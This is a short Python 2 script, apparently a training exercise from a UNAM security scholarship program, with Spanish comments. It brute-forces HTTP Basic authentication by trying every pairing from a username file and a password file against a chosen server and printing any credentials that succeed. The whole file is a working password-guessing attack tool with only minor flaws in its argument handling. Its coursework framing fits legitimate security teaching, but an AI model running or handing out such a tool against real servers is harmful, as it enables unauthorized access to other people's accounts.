#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-Becarios

#Leal Gonzalez Ignacio Ejercicio 7 Validar usuarios y passwords dados un acrchivo con usuarios y otro con passwords

# Importamos bibliotecas para el uso de excepciones y para la entrada de archivos
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError

# Funcion para imprimir un error
def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

# Distintas banderas que utilizara nuestro programa
def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts

# Cuando no se especifican bien las banderas
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass

# Direccion ip del servidor al cual vamos atacar la convierte en formato de URL
def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

# Formamos el paquete con nuestro usuario y password para encontrar las credenciales
def makeRequest(host, user, password):
    '''
    Pasamos tres parametros la url del servidor, el archivo de los usuarios y el archivo de los passwords, primero abrimos los archivos y los guardamos en dos listas, se va hacer un ciclo for anidado
    en donde el primer for va a ir cambiando el usuario y el segundo el password dentro del segundo se va a ir comprobando si es la credencial correcta con la combinacion del usuario y del password
    si es correcta vamos a obtner un codigo 200 y mostrara el usuario y el password con el cual se logro entrar en caso contrario mostrara un mensaje diciendo que no funciono, si hay un error de
    conexion mostrara un mensaje de error
    '''
    try:
        with open(user,'r') as usuario:
             usuarios = [linea.strip() for linea in usuario]
        with open(password,'r') as passw:
             contra = [linea.strip() for linea in passw]
        for aux in usuarios:
            for aux2 in contra:
                response = get(host, auth=(aux,aux2))
                if response.status_code == 200:
                    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (aux,aux2)
                else:
                    print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

# Esta parte es parecida a un main en c
if __name__ == '__main__':
    try:
        usuarios = sys.argv[1]
        passwords = sys.argv[2]
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        makeRequest(url, opts.user, opts.password)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
